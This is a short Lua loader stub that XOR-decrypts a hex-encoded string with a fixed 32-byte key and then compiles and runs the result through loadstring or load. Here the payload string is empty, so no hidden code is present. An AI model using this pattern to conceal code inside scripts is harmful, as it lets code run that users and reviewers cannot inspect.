local k={22,119,73,125,5,114,168,220,16,246,158,168,48,102,207,121,221,137,99,241,246,32,148,164,36,163,151,55,119,216,211,81}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
